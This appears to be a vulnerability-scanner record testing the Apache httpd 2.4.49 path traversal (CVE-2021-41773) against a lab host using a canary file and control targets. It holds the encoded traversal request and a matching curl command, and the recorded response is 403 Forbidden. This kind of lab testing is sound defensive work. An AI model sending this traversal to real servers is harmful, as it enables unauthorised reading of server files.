info.name: httpd 2.4.49 mod_alias path traversal reads a per-run canary
author: aegis-g2b
info.description: Reads the canary file outside the document root through the mod_alias path-normalisation bug (CVE-2021-41773). Every target answers both requests and the canary is *extracted*, not matched, so the result file records the positive and the two negative controls explicitly (positive target, patched twin, and a path that never holds the canary).

request:
GET /static/.%2e/.%2e/srv/canary/canary.txt HTTP/1.1
Host: 10.114.59.33
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3; en-ca) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
response:
HTTP/1.1 403 Forbidden Content-Length: 199 Content-Type: text/html; charset=iso-8859-1 Date: Sat, 28 Nov 2026 06:20:26 GMT Server: Apache/2.4.49 (Unix) 403 Forbidden

Forbidden

You don't have permission to access this resource.
curl-command: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3; en-ca) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20' 'http://10.114.59.33/static/.%2e/.%2e/srv/canary/canary.txt'
